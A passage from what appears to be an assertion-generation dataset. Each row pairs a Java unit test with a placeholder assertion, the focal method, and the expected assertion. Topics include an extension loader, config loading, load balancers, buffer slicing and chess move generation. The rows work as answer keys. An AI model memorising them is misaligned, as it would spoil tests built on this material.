getLoader(Class<S> type) { // 扩展类型必须是接口 if (!type.isInterface()) { throw new IllegalStateException(type.getName() + "" is not interface""); } SPI annotation = type.getAnnotation(SPI.class); if (annotation == null) { throw new IllegalStateException(type.getName() + "" has not @SPI annotation.""); } ExtensionLoader<?> extensionLoader = extensionLoaderCache.get(type); if (extensionLoader != null) { //noinspection unchecked return (ExtensionLoader<S>) extensionLoader; } extensionLoader = new ExtensionLoader<>(type); extensionLoaderCache.putIfAbsent(type, extensionLoader); //noinspection unchecked return (ExtensionLoader<S>) extensionLoader; }"	assertNotNull(extensionLoader)
"getExtensionTest() { ExtensionLoader<?> extensionLoader = ExtensionLoader.getLoader(Extension.class); Extension extension = (Extension) extensionLoader.getExtension(""other""); Assert.""<AssertPlaceHolder>""; }
getExtension(String name) { if (StrUtil.isBlank(name)) { return getDefaultExtension(); } // 从缓存中获取单例 T extension = extensionsCache.get(name); if (extension == null) { Object lock = createExtensionLockMap.computeIfAbsent(name, k -> new Object()); //noinspection SynchronizationOnLocalVariableOrMethodParameter synchronized (lock) { extension = extensionsCache.get(name); if (extension == null) { extension = createExtension(name); extensionsCache.put(name, extension); } } } return extension; }"	assertTrue(extension instanceof OtherExtension)
"getDefaultExtensionTest() { ExtensionLoader<?> extensionLoader = ExtensionLoader.getLoader(Extension.class); Object extension = extensionLoader.getDefaultExtension(); Assert.""<AssertPlaceHolder>""; }
getDefaultExtension() { return getExtension(defaultNameCache); }"	assertTrue(extension instanceof DefaultExtension)
"systemPropertyLoaderTest() { String address = ""zk://localhost:2181""; System.setProperty(""registry.address"", address); RegistryConfig registryConfig = CONFIG_MANAGER.getRegistryConfig(); Assert.""<AssertPlaceHolder>""; }
getRegistryConfig() { return loadConfig(RegistryConfig.class); }"	assertEquals(address, registryConfig.getAddress())
"propertiesLoaderTest() { String address = ""zk://localhost:2181""; RegistryConfig registryConfig = CONFIG_MANAGER.getRegistryConfig(); Assert.""<AssertPlaceHolder>""; }
getRegistryConfig() { return loadConfig(RegistryConfig.class); }"	assertEquals(address, registryConfig.getAddress())
"loaderPriorityTest() { String systemPropertyAddress = ""zk://localhost2:2181""; System.setProperty(""registry.address"", systemPropertyAddress); RegistryConfig registryConfig = CONFIG_MANAGER.getRegistryConfig(); Assert.""<AssertPlaceHolder>""; }
getRegistryConfig() { return loadConfig(RegistryConfig.class); }"	assertEquals(systemPropertyAddress, registryConfig.getAddress())
"randomTest() { Map<URL, Integer> counter = new HashMap<>(4); int runs = 50000; for (int i = 0; i < runs; i++) { URL url = RANDOM_LOAD_BALANCE.select(candidateUrls, RPC_REQUEST); counter.put(url, counter.getOrDefault(url, 0) + 1); } double avg = (double) runs / (double) counter.size(); for (Integer count : counter.values()) { // count 必须处于 0 到 2 * avg 之间 Assert.""<AssertPlaceHolder>""; } }
select(List<URL> candidateUrls, RpcRequest request);"	assertTrue(count < 2 * avg)
"roundRobinTest() { for (int i = 0; i < 500; i++) { URL url = ROUND_ROBIN_LOAD_BALANCE.select(candidateUrls, RPC_REQUEST); Assert.""<AssertPlaceHolder>""; } }
select(List<URL> candidateUrls, RpcRequest request);"	assertEquals(candidateUrls.get(i % candidateUrls.size()), url)
"testSliceSortedBufferByMapRangeCase1() { Map<Integer, List<ShuffleBlockInfo>> indexMap = new HashMap<>();  indexMap.put(0, Arrays.asList(new ShuffleBlockInfo(0, 50), new ShuffleBlockInfo(50, 30))); indexMap.put(1, Arrays.asList(new ShuffleBlockInfo(0, 20), new ShuffleBlockInfo(20, 30)));  for (ShuffleBlockInfo blockInfo : indexMap.values().stream().flatMap(List::stream).toArray(ShuffleBlockInfo[]::new)) { byte[] data = new byte[(int) blockInfo.length]; Arrays.fill(data, (byte) blockInfo.offset); // Fill data with offset value for simplicity sortedByteBuf.addComponents(Unpooled.wrappedBuffer(data)); }  ShuffleBlockInfoUtils.sliceSortedBufferByMapRange( 0, 1, indexMap, sortedByteBuf, targetByteBuf, shuffleChunkSize);  Assert.""<AssertPlaceHolder>""; }
sliceSortedBufferByMapRange( int startMapIndex, int endMapIndex, Map<Integer, List<ShuffleBlockInfo>> indexMap, CompositeByteBuf sortedByteBuf, CompositeByteBuf targetByteBuf, long shuffleChunkSize) { int offset = 0; int length = 0; boolean blockBoundary = true; for (int i = startMapIndex; i < endMapIndex; i++) { List<ShuffleBlockInfo> blockInfos = indexMap.get(i); if (blockInfos != null) { for (ShuffleBlockInfo blockInfo : blockInfos) { if (blockBoundary) { offset = (int) blockInfo.offset; blockBoundary = false; } length += (int) blockInfo.length; if (length - offset > shuffleChunkSize) { // Do not retain this buffer because this buffer // will be released when the fileinfo is released targetByteBuf.addComponent(sortedByteBuf.slice(offset, length)); blockBoundary = true; length = 0; } } } } // process last small block if (length != 0) { // Do not retain this buffer because this buffer // will be released when the fileinfo is released targetByteBuf.addComponent(sortedByteBuf.slice(offset, length)); } }"	"assertEquals( ""Unexpected number of components in target buffer"", 1, targetByteBuf.numComponents())"
"testSliceSortedBufferByMapRangeCase2() { Map<Integer, List<ShuffleBlockInfo>> indexMap = new HashMap<>();  indexMap.put(0, Arrays.asList(new ShuffleBlockInfo(0, 50), new ShuffleBlockInfo(50, 50))); indexMap.put(1, Arrays.asList(new ShuffleBlockInfo(0, 20), new ShuffleBlockInfo(20, 30)));  for (ShuffleBlockInfo blockInfo : indexMap.values().stream().flatMap(List::stream).toArray(ShuffleBlockInfo[]::new)) { byte[] data = new byte[(int) blockInfo.length]; Arrays.fill(data, (byte) blockInfo.offset); // Fill data with offset value for simplicity sortedByteBuf.addComponents(Unpooled.wrappedBuffer(data)); }  ShuffleBlockInfoUtils.sliceSortedBufferByMapRange( 0, 1, indexMap, sortedByteBuf, targetByteBuf, shuffleChunkSize);  Assert.""<AssertPlaceHolder>""; }
sliceSortedBufferByMapRange( int startMapIndex, int endMapIndex, Map<Integer, List<ShuffleBlockInfo>> indexMap, CompositeByteBuf sortedByteBuf, CompositeByteBuf targetByteBuf, long shuffleChunkSize) { int offset = 0; int length = 0; boolean blockBoundary = true; for (int i = startMapIndex; i < endMapIndex; i++) { List<ShuffleBlockInfo> blockInfos = indexMap.get(i); if (blockInfos != null) { for (ShuffleBlockInfo blockInfo : blockInfos) { if (blockBoundary) { offset = (int) blockInfo.offset; blockBoundary = false; } length += (int) blockInfo.length; if (length - offset > shuffleChunkSize) { // Do not retain this buffer because this buffer // will be released when the fileinfo is released targetByteBuf.addComponent(sortedByteBuf.slice(offset, length)); blockBoundary = true; length = 0; } } } } // process last small block if (length != 0) { // Do not retain this buffer because this buffer // will be released when the fileinfo is released targetByteBuf.addComponent(sortedByteBuf.slice(offset, length)); } }"	"assertEquals( ""Unexpected number of components in target buffer"", 1, targetByteBuf.numComponents())"
"testSliceSortedBufferByMapRangeCase3() { Map<Integer, List<ShuffleBlockInfo>> indexMap = new HashMap<>();  indexMap.put(0, Arrays.asList(new ShuffleBlockInfo(0, 50), new ShuffleBlockInfo(50, 51))); indexMap.put(1, Arrays.asList(new ShuffleBlockInfo(0, 20), new ShuffleBlockInfo(20, 30)));  for (ShuffleBlockInfo blockInfo : indexMap.values().stream().flatMap(List::stream).toArray(ShuffleBlockInfo[]::new)) { byte[] data = new byte[(int) blockInfo.length]; Arrays.fill(data, (byte) blockInfo.offset); // Fill data with offset value for simplicity sortedByteBuf.addComponents(Unpooled.wrappedBuffer(data)); }  ShuffleBlockInfoUtils.sliceSortedBufferByMapRange( 0, 1, indexMap, sortedByteBuf, targetByteBuf, shuffleChunkSize);  Assert.""<AssertPlaceHolder>""; }
sliceSortedBufferByMapRange( int startMapIndex, int endMapIndex, Map<Integer, List<ShuffleBlockInfo>> indexMap, CompositeByteBuf sortedByteBuf, CompositeByteBuf targetByteBuf, long shuffleChunkSize) { int offset = 0; int length = 0; boolean blockBoundary = true; for (int i = startMapIndex; i < endMapIndex; i++) { List<ShuffleBlockInfo> blockInfos = indexMap.get(i); if (blockInfos != null) { for (ShuffleBlockInfo blockInfo : blockInfos) { if (blockBoundary) { offset = (int) blockInfo.offset; blockBoundary = false; } length += (int) blockInfo.length; if (length - offset > shuffleChunkSize) { // Do not retain this buffer because this buffer // will be released when the fileinfo is released targetByteBuf.addComponent(sortedByteBuf.slice(offset, length)); blockBoundary = true; length = 0; } } } } // process last small block if (length != 0) { // Do not retain this buffer because this buffer // will be released when the fileinfo is released targetByteBuf.addComponent(sortedByteBuf.slice(offset, length)); } }"	"assertEquals( ""Unexpected number of components in target buffer"", 1, targetByteBuf.numComponents())"
"testSliceSortedBufferByMapRangeCase4() { Map<Integer, List<ShuffleBlockInfo>> indexMap = new HashMap<>();  indexMap.put( 0, Arrays.asList( new ShuffleBlockInfo(0, 50), new ShuffleBlockInfo(50, 51), new ShuffleBlockInfo(101, 49), new ShuffleBlockInfo(150, 51))); indexMap.put(1, Arrays.asList(new ShuffleBlockInfo(0, 20), new ShuffleBlockInfo(20, 30)));  for (ShuffleBlockInfo blockInfo : indexMap.values().stream().flatMap(List::stream).toArray(ShuffleBlockInfo[]::new)) { byte[] data = new byte[(int) blockInfo.length]; Arrays.fill(data, (byte) blockInfo.offset); // Fill data with offset value for simplicity sortedByteBuf.addComponents(Unpooled.wrappedBuffer(data)); }  ShuffleBlockInfoUtils.sliceSortedBufferByMapRange( 0, 1, indexMap, sortedByteBuf, targetByteBuf, shuffleChunkSize);  Assert.""<AssertPlaceHolder>""; }
sliceSortedBufferByMapRange( int startMapIndex, int endMapIndex, Map<Integer, List<ShuffleBlockInfo>> indexMap, CompositeByteBuf sortedByteBuf, CompositeByteBuf targetByteBuf, long shuffleChunkSize) { int offset = 0; int length = 0; boolean blockBoundary = true; for (int i = startMapIndex; i < endMapIndex; i++) { List<ShuffleBlockInfo> blockInfos = indexMap.get(i); if (blockInfos != null) { for (ShuffleBlockInfo blockInfo : blockInfos) { if (blockBoundary) { offset = (int) blockInfo.offset; blockBoundary = false; } length += (int) blockInfo.length; if (length - offset > shuffleChunkSize) { // Do not retain this buffer because this buffer // will be released when the fileinfo is released targetByteBuf.addComponent(sortedByteBuf.slice(offset, length)); blockBoundary = true; length = 0; } } } } // process last small block if (length != 0) { // Do not retain this buffer because this buffer // will be released when the fileinfo is released targetByteBuf.addComponent(sortedByteBuf.slice(offset, length)); } }"	"assertEquals( ""Unexpected number of components in target buffer"", 2, targetByteBuf.numComponents())"
"testSliceWithEmptyMap() { Map<Integer, List<ShuffleBlockInfo>> indexMap = new HashMap<>();  ShuffleBlockInfoUtils.sliceSortedBufferByMapRange( 0, 0, indexMap, sortedByteBuf, targetByteBuf, shuffleChunkSize);  Assert.""<AssertPlaceHolder>""; }
sliceSortedBufferByMapRange( int startMapIndex, int endMapIndex, Map<Integer, List<ShuffleBlockInfo>> indexMap, CompositeByteBuf sortedByteBuf, CompositeByteBuf targetByteBuf, long shuffleChunkSize) { int offset = 0; int length = 0; boolean blockBoundary = true; for (int i = startMapIndex; i < endMapIndex; i++) { List<ShuffleBlockInfo> blockInfos = indexMap.get(i); if (blockInfos != null) { for (ShuffleBlockInfo blockInfo : blockInfos) { if (blockBoundary) { offset = (int) blockInfo.offset; blockBoundary = false; } length += (int) blockInfo.length; if (length - offset > shuffleChunkSize) { // Do not retain this buffer because this buffer // will be released when the fileinfo is released targetByteBuf.addComponent(sortedByteBuf.slice(offset, length)); blockBoundary = true; length = 0; } } } } // process last small block if (length != 0) { // Do not retain this buffer because this buffer // will be released when the fileinfo is released targetByteBuf.addComponent(sortedByteBuf.slice(offset, length)); } }"	"assertTrue( ""Target buffer should remain empty with an empty indexMap"", targetByteBuf.numComponents() == 0)"
"startingBoard() { Board board = Board.getStartBoard(); final List<Move> legalMoves = board.getLegalMoves(); Assert.""<AssertPlaceHolder>""; }
getLegalMoves() { final Piece king = getKing(playerToMove); //better to check for pin from king than discoveries if (inCheck) { final Set<Piece> attackers = attackingKing(king); final List<Move> legalMoves = new ArrayList<>(getMoveList(king)); if (attackers.size() < 2) { final Set<Piece> pinnedToKing = pinnedToKing(king).keySet(); final List<Piece> movableExceptKing = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.contains(piece)) .filter(piece -> !(piece.sameType(PieceType.KING))) .collect(Collectors.toList()); final Piece attacker = new ArrayList<>(attackers).get(0); final Set<Cell> cellsWithCheck = rayOfCheck(king, attacker); if (attacker.sameType(PieceType.PAWN)) { //enPassant can capture a checking pawn movableExceptKing.stream() .filter(piece -> piece.sameType(PieceType.PAWN)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> move.captureMove) .filter(move -> move.captureCell.equals(attacker.position)) .filter(move -> !move.captureCell.equals(move.target)) .forEach(legalMoves::add); } legalMoves.addAll(movableExceptKing.stream() .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> cellsWithCheck.contains(move.target)) .collect(Collectors.toList())); } return legalMoves; } else { final Map<Piece, Piece> pinnedToKing = pinnedToKing(king); final List<Move> normalMoves = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.containsKey(piece)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> !illegalEnPassant(move, king)) .collect(Collectors.toList()); final List<Move> pinnedPieceMoves = pinnedToKing.entrySet() .stream() .filter(entry -> !entry.getKey().sameType(PieceType.KNIGHT)) .map(this::getMovesWithinPin) .flatMap(Collection::stream) .collect(Collectors.toList()); normalMoves.addAll(pinnedPieceMoves); return normalMoves; } }"	assertEquals(20, legalMoves.size())
"blockCheck() { Board board = new Board(); board.placeKing(2, 5, Color.WHITE); board.placeRook(2, 0, Color.BLACK); board.placeKing(4, 4, Color.BLACK); board.placeBishop(1, 1, Color.WHITE); board.inCheck = true; System.out.println(board); System.out.println(board.getLegalMoves()); Assert.""<AssertPlaceHolder>""; }
getLegalMoves() { final Piece king = getKing(playerToMove); //better to check for pin from king than discoveries if (inCheck) { final Set<Piece> attackers = attackingKing(king); final List<Move> legalMoves = new ArrayList<>(getMoveList(king)); if (attackers.size() < 2) { final Set<Piece> pinnedToKing = pinnedToKing(king).keySet(); final List<Piece> movableExceptKing = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.contains(piece)) .filter(piece -> !(piece.sameType(PieceType.KING))) .collect(Collectors.toList()); final Piece attacker = new ArrayList<>(attackers).get(0); final Set<Cell> cellsWithCheck = rayOfCheck(king, attacker); if (attacker.sameType(PieceType.PAWN)) { //enPassant can capture a checking pawn movableExceptKing.stream() .filter(piece -> piece.sameType(PieceType.PAWN)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> move.captureMove) .filter(move -> move.captureCell.equals(attacker.position)) .filter(move -> !move.captureCell.equals(move.target)) .forEach(legalMoves::add); } legalMoves.addAll(movableExceptKing.stream() .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> cellsWithCheck.contains(move.target)) .collect(Collectors.toList())); } return legalMoves; } else { final Map<Piece, Piece> pinnedToKing = pinnedToKing(king); final List<Move> normalMoves = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.containsKey(piece)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> !illegalEnPassant(move, king)) .collect(Collectors.toList()); final List<Move> pinnedPieceMoves = pinnedToKing.entrySet() .stream() .filter(entry -> !entry.getKey().sameType(PieceType.KNIGHT)) .map(this::getMovesWithinPin) .flatMap(Collection::stream) .collect(Collectors.toList()); normalMoves.addAll(pinnedPieceMoves); return normalMoves; } }"	assertEquals(6, board.getLegalMoves().size())
"doubleCheck() { Board board = new Board(); board.placeKing(4, 0, Color.WHITE); board.placeRook(3, 1, Color.WHITE); board.placeKing(3, 7, Color.BLACK); board.placeRook(1, 0, Color.BLACK); board.placeKnight(2, 0, Color.BLACK); System.out.println(board); System.out.println(board.getPiece(4, 0).getMoveList(board)); System.out.println(board.getLegalMoves()); board.playerToMove = Color.BLACK; board.makeMove(Move.get(board.getPiece(2, 0), Cell.get(3, 2), false)); System.out.println(board); System.out.println(board.getLegalMoves()); Assert.""<AssertPlaceHolder>""; }
getLegalMoves() { final Piece king = getKing(playerToMove); //better to check for pin from king than discoveries if (inCheck) { final Set<Piece> attackers = attackingKing(king); final List<Move> legalMoves = new ArrayList<>(getMoveList(king)); if (attackers.size() < 2) { final Set<Piece> pinnedToKing = pinnedToKing(king).keySet(); final List<Piece> movableExceptKing = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.contains(piece)) .filter(piece -> !(piece.sameType(PieceType.KING))) .collect(Collectors.toList()); final Piece attacker = new ArrayList<>(attackers).get(0); final Set<Cell> cellsWithCheck = rayOfCheck(king, attacker); if (attacker.sameType(PieceType.PAWN)) { //enPassant can capture a checking pawn movableExceptKing.stream() .filter(piece -> piece.sameType(PieceType.PAWN)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> move.captureMove) .filter(move -> move.captureCell.equals(attacker.position)) .filter(move -> !move.captureCell.equals(move.target)) .forEach(legalMoves::add); } legalMoves.addAll(movableExceptKing.stream() .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> cellsWithCheck.contains(move.target)) .collect(Collectors.toList())); } return legalMoves; } else { final Map<Piece, Piece> pinnedToKing = pinnedToKing(king); final List<Move> normalMoves = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.containsKey(piece)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> !illegalEnPassant(move, king)) .collect(Collectors.toList()); final List<Move> pinnedPieceMoves = pinnedToKing.entrySet() .stream() .filter(entry -> !entry.getKey().sameType(PieceType.KNIGHT)) .map(this::getMovesWithinPin) .flatMap(Collection::stream) .collect(Collectors.toList()); normalMoves.addAll(pinnedPieceMoves); return normalMoves; } }"	assertTrue(board.getLegalMoves().stream().allMatch(move -> move.piece.sameType(PieceType.KING)))
"pawnPromotion() { Board board = new Board(); board.placeKing(4, 0, Color.WHITE); board.placeKing(3, 7, Color.BLACK); board.placePawn(1, 1, Color.BLACK); board.playerToMove = Color.BLACK; System.out.println(board); System.out.println(board.getPiece(1, 1).getMoveList(board)); System.out.println(board.getLegalMoves()); board.makeMove(Move.get(board.getPiece(1, 1), Cell.get(0, 1), false, null, PieceType.QUEEN)); System.out.println(board); System.out.println(board.getLegalMoves()); Assert.""<AssertPlaceHolder>""; }
getLegalMoves() { final Piece king = getKing(playerToMove); //better to check for pin from king than discoveries if (inCheck) { final Set<Piece> attackers = attackingKing(king); final List<Move> legalMoves = new ArrayList<>(getMoveList(king)); if (attackers.size() < 2) { final Set<Piece> pinnedToKing = pinnedToKing(king).keySet(); final List<Piece> movableExceptKing = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.contains(piece)) .filter(piece -> !(piece.sameType(PieceType.KING))) .collect(Collectors.toList()); final Piece attacker = new ArrayList<>(attackers).get(0); final Set<Cell> cellsWithCheck = rayOfCheck(king, attacker); if (attacker.sameType(PieceType.PAWN)) { //enPassant can capture a checking pawn movableExceptKing.stream() .filter(piece -> piece.sameType(PieceType.PAWN)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> move.captureMove) .filter(move -> move.captureCell.equals(attacker.position)) .filter(move -> !move.captureCell.equals(move.target)) .forEach(legalMoves::add); } legalMoves.addAll(movableExceptKing.stream() .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> cellsWithCheck.contains(move.target)) .collect(Collectors.toList())); } return legalMoves; } else { final Map<Piece, Piece> pinnedToKing = pinnedToKing(king); final List<Move> normalMoves = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.containsKey(piece)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> !illegalEnPassant(move, king)) .collect(Collectors.toList()); final List<Move> pinnedPieceMoves = pinnedToKing.entrySet() .stream() .filter(entry -> !entry.getKey().sameType(PieceType.KNIGHT)) .map(this::getMovesWithinPin) .flatMap(Collection::stream) .collect(Collectors.toList()); normalMoves.addAll(pinnedPieceMoves); return normalMoves; } }"	assertTrue(board.playerPieces.get(Color.BLACK).stream().anyMatch(piece -> piece.sameType(PieceType.QUEEN)))
"pawnPromoteToKnight() { Board board = new Board(); board.placeKing(4, 0, Color.WHITE); board.placeKing(3, 7, Color.BLACK); board.placePawn(1, 1, Color.BLACK); board.playerToMove = Color.BLACK; System.out.println(board); System.out.println(board.getPiece(1, 1).getMoveList(board)); System.out.println(board.getLegalMoves()); board.makeMove(Move.get(board.getPiece(1, 1), Cell.get(0, 1), false, null, PieceType.KNIGHT)); System.out.println(board); System.out.println(board.getLegalMoves()); Assert.""<AssertPlaceHolder>""; }
getLegalMoves() { final Piece king = getKing(playerToMove); //better to check for pin from king than discoveries if (inCheck) { final Set<Piece> attackers = attackingKing(king); final List<Move> legalMoves = new ArrayList<>(getMoveList(king)); if (attackers.size() < 2) { final Set<Piece> pinnedToKing = pinnedToKing(king).keySet(); final List<Piece> movableExceptKing = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.contains(piece)) .filter(piece -> !(piece.sameType(PieceType.KING))) .collect(Collectors.toList()); final Piece attacker = new ArrayList<>(attackers).get(0); final Set<Cell> cellsWithCheck = rayOfCheck(king, attacker); if (attacker.sameType(PieceType.PAWN)) { //enPassant can capture a checking pawn movableExceptKing.stream() .filter(piece -> piece.sameType(PieceType.PAWN)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> move.captureMove) .filter(move -> move.captureCell.equals(attacker.position)) .filter(move -> !move.captureCell.equals(move.target)) .forEach(legalMoves::add); } legalMoves.addAll(movableExceptKing.stream() .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> cellsWithCheck.contains(move.target)) .collect(Collectors.toList())); } return legalMoves; } else { final Map<Piece, Piece> pinnedToKing = pinnedToKing(king); final List<Move> normalMoves = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.containsKey(piece)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> !illegalEnPassant(move, king)) .collect(Collectors.toList()); final List<Move> pinnedPieceMoves = pinnedToKing.entrySet() .stream() .filter(entry -> !entry.getKey().sameType(PieceType.KNIGHT)) .map(this::getMovesWithinPin) .flatMap(Collection::stream) .collect(Collectors.toList()); normalMoves.addAll(pinnedPieceMoves); return normalMoves; } }"	assertTrue(board.playerPieces.get(Color.BLACK).stream().anyMatch(piece -> piece.sameType(PieceType.KNIGHT)))
"kingAndQueenOut() { Board board = Board.getStartBoard(); board = board.copy(); board.makeMove(board.getLegalMoves() .stream() .filter(c -> c.piece.sameType(PieceType.PAWN)) .filter(c -> c.piece.position.equals(Cell.get(1, 3))) .filter(c -> c.target.equals(Cell.get(2, 3))) .findAny() .get()); board = board.copy(); board.makeMove(board.getLegalMoves() .stream() .filter(c -> c.piece.sameType(PieceType.PAWN)) .filter(c -> c.piece.position.equals(Cell.get(6, 4))) .filter(c -> c.target.equals(Cell.get(5, 4))) .findAny() .get()); board = board.copy(); board.makeMove(board.getLegalMoves() .stream() .filter(c -> c.piece.sameType(PieceType.KING)) .filter(c -> c.piece.position.equals(Cell.get(0, 4))) .filter(c -> c.target.equals(Cell.get(1, 3))) .findAny() .get()); board = board.copy(); board.makeMove(board.getLegalMoves() .stream() .filter(c -> c.piece.sameType(PieceType.QUEEN)) .filter(c -> c.piece.position.equals(Cell.get(7, 3))) .filter(c -> c.target.equals(Cell.get(6, 4))) .findAny() .get()); System.out.println(board); System.out.println(board.getLegalMoves()); Assert.""<AssertPlaceHolder>""; }
getLegalMoves() { final Piece king = getKing(playerToMove); //better to check for pin from king than discoveries if (inCheck) { final Set<Piece> attackers = attackingKing(king); final List<Move> legalMoves = new ArrayList<>(getMoveList(king)); if (attackers.size() < 2) { final Set<Piece> pinnedToKing = pinnedToKing(king).keySet(); final List<Piece> movableExceptKing = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.contains(piece)) .filter(piece -> !(piece.sameType(PieceType.KING))) .collect(Collectors.toList()); final Piece attacker = new ArrayList<>(attackers).get(0); final Set<Cell> cellsWithCheck = rayOfCheck(king, attacker); if (attacker.sameType(PieceType.PAWN)) { //enPassant can capture a checking pawn movableExceptKing.stream() .filter(piece -> piece.sameType(PieceType.PAWN)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> move.captureMove) .filter(move -> move.captureCell.equals(attacker.position)) .filter(move -> !move.captureCell.equals(move.target)) .forEach(legalMoves::add); } legalMoves.addAll(movableExceptKing.stream() .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> cellsWithCheck.contains(move.target)) .collect(Collectors.toList())); } return legalMoves; } else { final Map<Piece, Piece> pinnedToKing = pinnedToKing(king); final List<Move> normalMoves = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.containsKey(piece)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> !illegalEnPassant(move, king)) .collect(Collectors.toList()); final List<Move> pinnedPieceMoves = pinnedToKing.entrySet() .stream() .filter(entry -> !entry.getKey().sameType(PieceType.KNIGHT)) .map(this::getMovesWithinPin) .flatMap(Collection::stream) .collect(Collectors.toList()); normalMoves.addAll(pinnedPieceMoves); return normalMoves; } }"	assertEquals(23, board.getLegalMoves().size())
"kingAndKnightOut() { Board board = Board.getStartBoard(); board = board.copy(); board.makeMove(board.getLegalMoves() .stream() .filter(c -> c.piece.sameType(PieceType.PAWN)) .filter(c -> c.piece.position.equals(Cell.get(1, 3))) .filter(c -> c.target.equals(Cell.get(2, 3))) .findAny() .get()); board = board.copy(); board.makeMove(board.getLegalMoves() .stream() .filter(c -> c.piece.sameType(PieceType.PAWN)) .filter(c -> c.piece.position.equals(Cell.get(6, 4))) .filter(c -> c.target.equals(Cell.get(5, 4))) .findAny() .get()); board = board.copy(); board.makeMove(board.getLegalMoves() .stream() .filter(c -> c.piece.sameType(PieceType.KING)) .filter(c -> c.piece.position.equals(Cell.get(0, 4))) .filter(c -> c.target.equals(Cell.get(1, 3))) .findAny() .get()); board = board.copy(); board.makeMove(board.getLegalMoves() .stream() .filter(c -> c.piece.sameType(PieceType.KNIGHT)) .filter(c -> c.piece.position.equals(Cell.get(7, 6))) .filter(c -> c.target.equals(Cell.get(5, 5))) .findAny() .get()); System.out.println(board); System.out.println(board.getLegalMoves()); Assert.""<AssertPlaceHolder>""; }
getLegalMoves() { final Piece king = getKing(playerToMove); //better to check for pin from king than discoveries if (inCheck) { final Set<Piece> attackers = attackingKing(king); final List<Move> legalMoves = new ArrayList<>(getMoveList(king)); if (attackers.size() < 2) { final Set<Piece> pinnedToKing = pinnedToKing(king).keySet(); final List<Piece> movableExceptKing = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.contains(piece)) .filter(piece -> !(piece.sameType(PieceType.KING))) .collect(Collectors.toList()); final Piece attacker = new ArrayList<>(attackers).get(0); final Set<Cell> cellsWithCheck = rayOfCheck(king, attacker); if (attacker.sameType(PieceType.PAWN)) { //enPassant can capture a checking pawn movableExceptKing.stream() .filter(piece -> piece.sameType(PieceType.PAWN)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> move.captureMove) .filter(move -> move.captureCell.equals(attacker.position)) .filter(move -> !move.captureCell.equals(move.target)) .forEach(legalMoves::add); } legalMoves.addAll(movableExceptKing.stream() .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> cellsWithCheck.contains(move.target)) .collect(Collectors.toList())); } return legalMoves; } else { final Map<Piece, Piece> pinnedToKing = pinnedToKing(king); final List<Move> normalMoves = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.containsKey(piece)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> !illegalEnPassant(move, king)) .collect(Collectors.toList()); final List<Move> pinnedPieceMoves = pinnedToKing.entrySet() .stream() .filter(entry -> !entry.getKey().sameType(PieceType.KNIGHT)) .map(this::getMovesWithinPin) .flatMap(Collection::stream) .collect(Collectors.toList()); normalMoves.addAll(pinnedPieceMoves); return normalMoves; } }"	assertEquals(23, board.getLegalMoves().size())
"kingAndPawnOut() { Board board = Board.getStartBoard(); board = board.copy(); board.makeMove(board.getLegalMoves() .stream() .filter(c -> c.piece.sameType(PieceType.PAWN)) .filter(c -> c.piece.position.equals(Cell.get(1, 3))) .filter(c -> c.target.equals(Cell.get(2, 3))) .findAny() .get()); board = board.copy(); board.makeMove(board.getLegalMoves() .stream() .filter(c -> c.piece.sameType(PieceType.PAWN)) .filter(c -> c.piece.position.equals(Cell.get(6, 6))) .filter(c -> c.target.equals(Cell.get(4, 6))) .findAny() .get()); board = board.copy(); board.makeMove(board.getLegalMoves() .stream() .filter(c -> c.piece.sameType(PieceType.KING)) .filter(c -> c.piece.position.equals(Cell.get(0, 4))) .filter(c -> c.target.equals(Cell.get(1, 3))) .findAny() .get()); board = board.copy(); board.makeMove(board.getLegalMoves() .stream() .filter(c -> c.piece.sameType(PieceType.PAWN)) .filter(c -> c.piece.position.equals(Cell.get(4, 6))) .filter(c -> c.target.equals(Cell.get(3, 6))) .findAny() .get()); System.out.println(board); System.out.println(board.getLegalMoves()); Assert.""<AssertPlaceHolder>""; }
